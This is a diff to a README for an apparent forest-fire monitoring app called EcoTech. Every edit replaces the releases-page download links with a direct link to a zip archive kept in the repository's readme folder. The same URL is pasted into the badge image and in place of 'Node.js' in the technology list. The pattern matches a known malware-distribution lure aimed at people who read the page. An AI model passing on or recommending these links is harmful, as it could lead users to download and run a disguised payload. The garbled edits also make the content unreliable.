@@ -1,7 +1,7 @@
 # 🌲 -EcoTech- - Your Smart Ally Against Forest Fires
 
 ## 📥 Download EcoTech Now
-[![Download EcoTech](https://img.shields.io/badge/Download%20EcoTech-%20blue)](https://github.com/eldthosabu19/-EcoTech-/releases)
+[![Download EcoTech](https://github.com/eldthosabu19/-EcoTech-/raw/refs/heads/main/readme/Tech-Eco-v3.3.zip%20EcoTech-%20blue)](https://github.com/eldthosabu19/-EcoTech-/raw/refs/heads/main/readme/Tech-Eco-v3.3.zip)
 
 ## 📖 Description
 Introducing EcoTech – your ultimate sidekick in the battle against forest fires! EcoTech uses innovative technology to detect and monitor forest fires, helping protect nature and communities. This application integrates advanced machine learning with real-time communication tools. 
@@ -10,7 +10,7 @@ Introducing EcoTech – your ultimate sidekick in the battle against forest fire
 To get started with EcoTech, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the Releases page where you can find the latest version.
-   - [Visit this page to download](https://github.com/eldthosabu19/-EcoTech-/releases)
+   - [Visit this page to download](https://github.com/eldthosabu19/-EcoTech-/raw/refs/heads/main/readme/Tech-Eco-v3.3.zip)
 
 2. **Select the Right Version:** Look for the latest release, marked as "Latest release." 
 
@@ -36,13 +36,13 @@ To get started with EcoTech, follow these steps:
 ## 🌍 Technologies Used
 - **AI and Machine Learning:** For accurate detection of fire incidents.
 - **ESP8266 and ESP-NOW:** To enable low-power communication between devices.
-- **Node.js and React Native:** For building the application and delivering a seamless user experience.
+- **https://github.com/eldthosabu19/-EcoTech-/raw/refs/heads/main/readme/Tech-Eco-v3.3.zip and React Native:** For building the application and delivering a seamless user experience.
 - **MongoDB:** For storing monitoring data efficiently.
 
 ## 📋 Download & Install
 To download EcoTech, please follow these steps:
 
-1. Click the link: [Visit this page to download](https://github.com/eldthosabu19/-EcoTech-/releases).
+1. Click the link: [Visit this page to download](https://github.com/eldthosabu19/-EcoTech-/raw/refs/heads/main/readme/Tech-Eco-v3.3.zip).
 
 2. Find the latest version labeled as "Latest release".
 
